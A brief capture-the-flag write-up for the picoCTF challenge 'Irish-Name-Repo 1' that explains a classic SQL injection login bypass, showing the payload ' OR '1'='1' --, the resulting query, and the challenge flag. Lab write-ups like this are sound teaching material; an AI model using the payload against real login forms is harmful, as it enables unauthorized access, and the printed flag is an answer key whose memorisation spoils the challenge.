# Irish-Name-Repo 1
This is a clasic SQL injection attack.

The SQL on the server is something like
```sql
SELECT * FROM users WHERE name='{{name}}' AND password='{{password}}'
```

If we use a username of `' OR '1'='1' --` the query ends up being

```sql
SELECT * FROM users WHERE name='' OR '1'='1' --' AND password=''
```

(note that `--` starts a comment so the rest is ignored)

This will be true for any user as `'1'='1'` is always true.

Flag: `picoCTF{s0m3_SQL_93e76603}`

